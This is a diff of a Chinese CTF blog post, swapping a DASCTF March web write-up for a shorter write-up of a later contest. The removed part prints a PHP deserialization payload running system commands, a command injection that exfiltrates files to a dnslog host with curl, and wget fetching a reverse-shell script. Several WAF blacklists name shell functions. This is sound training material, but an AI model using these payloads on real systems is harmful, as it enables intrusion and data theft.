@@ -4,14 +4,15 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="dasctf三月赛复现, Ethe&#39;s blog">
-    <meta name="description" content="WEB感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个，这里主要是复现一下web方面
-ezpop确实是一个简单的php
-&amp;lt;?php
+    <meta name="keywords" content="天山固网, Ethe&#39;s blog">
+    <meta name="description" content="为什么报名是学生组打比赛分到了企业组捏，企业这群人也太卷了
+（只有web是我做的，其他跟我没啥关系
+签到尝试一下解密？url解码
 
-class crow
-&amp;#123;
-    public ">
+简单的图片拖进gimp里看到有三个图层，删去最上边的一个，就能看见flag
+
+
+webguesssql盲注，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +24,7 @@ class crow
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>dasctf三月赛复现 | Ethe&#39;s blog</title>
+    <title>天山固网 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -332,7 +333,7 @@ class crow
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">dasctf三月赛复现</h1>
+                    <h1 class="description center-align post-title">天山固网</h1>
                 </div>
             </div>
         </div>
@@ -478,28 +479,28 @@ class crow
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-30
+                    2022-06-28
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-08
+                    2022-09-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.7k
+                    916
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    19 分
+                    4 分
                 </div>
                 
 
@@ -522,453 +523,155 @@ class crow
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个，这里主要是复现一下web方面</p>
-<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>确实是一个简单的php</p>
-<pre class="language-none"><code class="language-none">&lt;?php
-
-class crow
-&#123;
-    public $v1;
-    public $v2;
-
-    function eval() &#123;
-        echo new $this-&gt;v1($this-&gt;v2);
-    &#125;
-
-    public function __invoke()
+                <p>为什么报名是学生组打比赛分到了企业组捏，企业这群人也太卷了</p>
+<p>（只有web是我做的，其他跟我没啥关系</p>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h2 id="尝试一下解密？"><a href="#尝试一下解密？" class="headerlink" title="尝试一下解密？"></a>尝试一下解密？</h2><p>url解码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ciscn2022/image-20220626141958790.png" alt="image-20220626141958790"></p>
+<h2 id="简单的图片"><a href="#简单的图片" class="headerlink" title="简单的图片"></a>简单的图片</h2><p>拖进gimp里看到有三个图层，删去最上边的一个，就能看见flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160445309.png" alt="image-20220626160445309"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626160608764.png" alt="image-20220626160608764"></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>sql盲注，唯一的问题是这里只允许最大有四个参数，所以在盲注第五个数时要删去第一个</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143623880.png" alt="image-20220626143623880"></p>
+<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>利用file协议查看etc/hosts文件，找到主机的网段</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626143722528.png" alt="image-20220626143722528"></p>
+<p>bp扫一下，发现在100里有内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626144207786.png" alt="image-20220626144207786"></p>
+<p>接下来就是利用gopher协议把referer=dasctf.com带进去</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145210597.png" alt="image-20220626145210597"></p>
+<p>提示要post一个参数dasctf，而且这个参数还要等于flag</p>
+<p>重新构造gopher语句，最终得到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145241386.png" alt="image-20220626145241386"></p>
+<h2 id="MagicalType"><a href="#MagicalType" class="headerlink" title="MagicalType"></a>MagicalType</h2><p>robots.txt里有个hint.php,访问一下，发现源码里是些html代码，拖到文档里改成html格式</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626151308282.png" alt="image-20220626151308282"></p>
+<p>利用数组溢出和filter伪协议读index.php的文件内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153834734.png" alt="image-20220626153834734"></p>
+<p>解码之后是个反序列化</p>
+<pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
+class Evil&#123;
+    public $flag &#x3D; 1;
+    public function __wakeup()
     &#123;
-        $this-&gt;v1-&gt;world();
+        $this-&gt;flag &#x3D; 0;
     &#125;
-&#125;
-
-class fin
-&#123;
-    public $f1;
-
-    public function __destruct()&#x2F;&#x2F;反序列化的入口
+    public function __destruct()
     &#123;
-        echo $this-&gt;f1 . &#39;114514&#39;;
-    &#125;
-
-    public function run()
-    &#123;
-        ($this-&gt;f1)();
-    &#125;
-
-    public function __call($a, $b)
-    &#123;
-        echo $this-&gt;f1-&gt;get_flag();
-    &#125;
-
-&#125;
-
-class what
-&#123;
-    public $a;
-
-    public function __toString()
-    &#123;
-        $this-&gt;a-&gt;run();
-        return &#39;hello&#39;;
-    &#125;
-&#125;
-class mix
-&#123;
-    public $m1;
-
-    public function run()
-    &#123;
-        ($this-&gt;m1)();
-    &#125;
-
-    public function get_flag()
-    &#123;
-        eval(&#39;#&#39; . $this-&gt;m1);
+        if($this-&gt;flag &#x3D;&#x3D; 1)
+        &#123;
+            echo(&quot;How you did it?&quot;);
+            $xux &#x3D; file_get_contents($_GET[&#39;xux&#39;]);
+            create_function(&quot;&quot;,$xux);
+        &#125;
+        else&#123;
+            die(&quot;nonono&quot;);
+        &#125;
     &#125;
 
 &#125;
-
-if (isset($_POST[&#39;cmd&#39;])) &#123;
-    unserialize($_POST[&#39;cmd&#39;]);
-&#125; else &#123;
-    highlight_file(__FILE__);
+$o &#x3D; $_GET[&#39;o&#39;];
+if(isset($o))
+&#123;
+    unserialize($o);
 &#125;</code></pre>
 
-<p>完整的反序列化链为</p>
-<pre class="language-none"><code class="language-none">fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag</code></pre>
+<p>我们要利用的函数就算create_function，这个函数有个命令注入的漏洞。而$xux参数可以利用data协议进行控制，至于wakeup的绕过可以将最前面的O改成C（陇原战役里考过</p>
+<p>之后发现空格也被过滤了，用${IFS}绕过</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626153756895.png" alt="image-20220626153756895"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="掩耳盗铃"><a href="#掩耳盗铃" class="headerlink" title="掩耳盗铃"></a>掩耳盗铃</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626145446137.png" alt="image-20220626145446137"></p>
+<p>压缩包解压出来的改成ppt格式然后把叠加的图层全删了</p>
+<h2 id="chrchrchr"><a href="#chrchrchr" class="headerlink" title="chrchrchr"></a>chrchrchr<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162933197.png" alt="image-20220626162933197"></h2><p>感觉像蚁剑的流量，蚁剑加密的方式就是base64加密之后再在前面添几位，所以从tcp流18开始往后找，删掉前两个字符先url解码再base64解码，把写入a.txt的内容拼起来</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626162737108.png" alt="image-20220626162737108"></p>
+<pre class="language-none"><code class="language-none">KJCUMVCRGFJEOZL2JJWE2V2RGNMW2SLXJZLVCM2ONJWGUTLNJZVU2VCBPBHFIZDIJZVFSMCOIRSGQTKHKJVWMUJ5HU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 
-<p>在get_flag函数里可以利用换行符来防止自己的命令被其中的井号注释，达到命令执行的目的</p>
-<pre class="language-none"><code class="language-none">class crow
+然后进行base32解码，再base64得到flag
+</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626163754458.png" alt="image-20220626163754458"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="measyasm"><a href="#measyasm" class="headerlink" title="measyasm"></a>measyasm</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150259303.png" alt="image-20220626150259303"></p>
+<p>自减</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626150733844.png" alt="image-20220626150733844"></p>
+<h2 id="PEinM"><a href="#PEinM" class="headerlink" title="PEinM"></a>PEinM</h2><p>拖进ida里动调</p>
+<p>能看出来在这里有一个被魔改过的xxtea</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/tsgw/image-20220626174638274.png" alt="image-20220626174638274"></p>
+<p>逆一下脚本</p>
+<pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#define DELTA 0x9E377AB9 
+#define MX (((z&gt;&gt;4^y&lt;&lt;3) + (y&gt;&gt;4^z&lt;&lt;3)) ^ ((sum^y) + (key[p&amp;0xa^e] ^ z)))  
+unsigned long long Summation(int n, unsigned long long delat)
 &#123;
-    public $v1;
-    public $v2;
+        unsigned long long sum &#x3D; 0;
+        for(int i &#x3D; 0; i &lt; 52&#x2F;n+6; i++)
+                sum +&#x3D; delat;
+        return sum;
 &#125;
 
-class fin
-&#123;
-    public $f1;
-
-&#125;
-
-class what
-&#123;
-    public $a;
-&#125;
-class mix
-&#123;
-    public $m1;
-    public function get_flag()
+void btea(unsigned long long *v, int n, unsigned long long const key[4])   
+&#123;                                                      
+    unsigned long long y, z, sum;                               
+    unsigned p, round, e;                            
+    if (n &gt; 1)         
     &#123;
-        eval(&#39;#&#39; . $this-&gt;m1);
-    &#125;
-
-&#125;
-$a &#x3D; new fin();
-$a -&gt;f1 &#x3D; new what();
-$a -&gt;f1-&gt;a &#x3D; new mix();
-$a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow();
-$a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin();
-$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix();
-$a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;;
-echo serialize($a);
-&#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;
-</code></pre>
-
-<p>因为我这里是用的%0a，应该是解析的时候把它变成了\n，所以这个值的长度其实是要比反序列化出的长度要少1</p>
-<p>最终payload：</p>
-<pre class="language-none"><code class="language-none">O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;
-然后cat读文件
-O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330135920958.png"></p>
-<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>app.py</p>
-<pre class="language-none"><code class="language-none">#coding&#x3D;utf-8
-from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
-import random
-from urllib import parse
-import os
-from werkzeug.utils import secure_filename
-import time
-
-
-app&#x3D;Flask(__name__)
-
-def waf(s):
-    blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;]
-    flag &#x3D; True
-    for no in blacklist:
-        if no.lower() in s.lower():
-            flag&#x3D; False
-            print(no)
-            break
-    return flag
-    
-
-@app.route(&quot;&#x2F;&quot;)
-def index():
-    &quot;欢迎来到SUctf2022&quot;
-    return render_template(&quot;index.html&quot;)
-
-@app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;])
-def calc():
-    ip &#x3D; request.remote_addr
-    num &#x3D; request.values.get(&quot;num&quot;)
-    log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)
-    
-    if waf(num):
-        try:
-            data &#x3D; eval(num)
-            os.system(log)
-        except:
-            pass
-        return str(data)
-    else:
-        return &quot;waf!!&quot;
-
-
-
-    
-
-if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
-    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000)  </code></pre>
-
-<p>对输入的内容先当作python语句执行，然后再执行log</p>
-<p>比赛的时候想的是绕过然后ssti注入，但是过滤的实在太多了</p>
-<p>所以只能放弃ssti来想对os.system的利用</p>
-<p>因为log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num)</p>
-<p>也就是说它会把这些内容输出存到log.txt里</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330140603838.png" alt="image-20220330140603838"></p>
-<p>本地尝试一下可以发现，如果echo 里用反引号加命令是可以执行的，而执行的结果会输入到log.txt中</p>
-<p>但是如果我们直接将</p>
-<pre class="language-none"><code class="language-none">num&#x3D;&#96;ls&#96;</code></pre>
-
-<p>输入，就会导致前边的eval函数报错，也就不会执行后面的system了。所以这时候我们就要利用井号来进行注释</p>
-<p>#再python中作为注释符来使用，但是在Linux中只有在句首的位置才能当作注释</p>
-<p>我们可以利用这个特性来实现对eval的绕过</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330150930650.png" alt="image-20220330150930650"></p>
-<p>#将后边的值都注释了，也就不会让eval报错了</p>
-<p>而对于Linux</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330151054801.png" alt="image-20220330151054801"></p>
-<p>既然井号可以绕过eval来执行我们的命令，那我们再试试能不能利用通配符直接读flag（这里其实应该先外带log.txt的内容看flag在的文件名的，但是复现的时候忘了</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\&#96;cat%09*1*\&#96;.locsor.dnslog.cn&#96;</code></pre>
-
-<p>成功了</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330144115215.png" alt="image-20220330144115215"></p>
-<p>但是显然因为dnslog一次只能带一条信息，而|又被ban掉了，不能利用sed来看其他的文件，所以猜到flag的难度很大，所以我们可以用wget来让靶机反弹shell</p>
-<p>1.sh就是一个正常的反弹shell的语句</p>
-<pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;ip&#x2F;1.sh&#96;</code></pre>
-
-<p>给一个可执行权限</p>
-<pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; </code></pre>
-
-<p>然后执行</p>
-<pre class="language-none"><code class="language-none">&#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; </code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145346259.png" alt="image-20220330145346259"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330145646941.png" alt="image-20220330145646941"></p>
-<p>拿到flag，和dnslog外带的结果一样</p>
-<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>只能传php，但是传php又会被过滤</p>
-<p>这里把Content-Type改成image/jpeg就能绕过</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212538985.png" alt="image-20220330212538985"></p>
-<p>eval应该是被过滤了，传马传不上去，可以先传个phpinfo()看看</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/dasctf%E4%B8%89%E6%9C%88/image-20220330212709209.png" alt="image-20220330212709209"></p>
-<p>第一次见这么多的disable_functions</p>
-<p>但是show_source，file_get_contents没被ban，可以用这个读取源码</p>
-<pre class="language-none"><code class="language-none">&lt;?php
-(&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;这里拼接绕过是因为这个函数是被放了黑名单里了
-?&gt;</code></pre>
-
-<p>index.php</p>
-<pre class="language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
-Server: openresty
-Date: Sat, 26 Mar 2022 09:01:18 GMT
-Content-Type: text&#x2F;html; charset&#x3D;UTF-8
-Content-Length: 1695
-Connection: close
-Vary: Accept-Encoding
-
-&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;
-&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;
-    嘿伙计，传个火？！
-    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;
-    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;
-&lt;&#x2F;form&gt;
-&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;
-&lt;?php
-function fun($var): bool&#123;
-    $blacklist &#x3D; [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;];
-
-    foreach($blacklist as $blackword)&#123;
-        if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstr大小写敏感，所以可以用大写绕过这个黑名单
-    &#125;
-
-    
-    return False;
-&#125;
-error_reporting(0);
-&#x2F;&#x2F;设置上传目录
-define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;);
-$msg &#x3D; &quot;Upload Success!&quot;;
-if (isset($_POST[&#39;submit&#39;])) &#123;
-$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);
-if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123;
-die(&quot;只要好看的php&quot;);
-&#125;
-
-$content &#x3D; file_get_contents($temp_file);
-if(fun($content))&#123;
-    die(&quot;诶，被我发现了吧&quot;);
-&#125;
-$new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext;
-        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;
-
-
-        if (move_uploaded_file($temp_file, $img_path))&#123;
-            $is_upload &#x3D; true;
-        &#125; else &#123;
-            $msg &#x3D; &#39;Upload Failed!&#39;;
-            die();
+        round &#x3D; 6 + 52&#x2F;n;               
+        sum &#x3D; 0;                        
+        z &#x3D; v[n-1];                     
+        do
+        &#123;
+            sum +&#x3D; DELTA;               
+            e &#x3D; (sum &gt;&gt; 2) &amp; 3;        
+            for (p&#x3D;0; p&lt;n-1; p++)       
+            &#123;
+                y &#x3D; v[p+1];
+                v[p] +&#x3D; MX;
+                      z &#x3D; v[p];     
+                        &#125;
+            y &#x3D; v[0];
+            z &#x3D; v[n-1] +&#x3D; MX;
         &#125;
-        echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;;
-&#125;
-</code></pre>
-
-<p>既然要绕过disable_functions,我们就要想到利用so文件</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客</a></p>
-<p>但是在so文件中有些符号会被这个文件上传页面的黑名单过滤</p>
-<p>所以这里我们要采用自己写一个文件上传的无黑名单的页面来绕过</p>
-<p>1.php</p>
-<pre class="language-none"><code class="language-none">PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0K
-base64解码后实际的内容
-
-
-
-&lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt;
-&lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt;
-    嘿伙计，传个火？！
-    &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt;
-    &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt;
-&lt;&#x2F;form&gt;
-&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt;
-&lt;?php
-error_reporting(0);
-&#x2F;&#x2F;设置上传目录
-define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;);
-$msg &#x3D; &quot;Upload Success!&quot;;
-if (isset($_POST[&#39;submit&#39;])) &#123;
-$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-$file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-$ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);
-&#x2F;&#x2F;xxxxx
-$content &#x3D; file_get_contents($temp_file);
-
-$new_file_name &#x3D; $file_name;
-        $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name;
-        if (move_uploaded_file($temp_file, $img_path))&#123;
-            $is_upload &#x3D; true;
-        &#125; else &#123;
-            $msg &#x3D; &#39;Upload Failed!&#39;;
-            die();
+        while (--round);
+    &#125;
+    else if (n &lt; -1)
+    &#123;
+        n &#x3D; -n;
+        round &#x3D; 6 + 52&#x2F;n;
+        sum &#x3D; Summation(n, DELTA); 
+        y &#x3D; v[0];
+        do
+        &#123;
+            e &#x3D; (sum &gt;&gt; 2) &amp; 3;
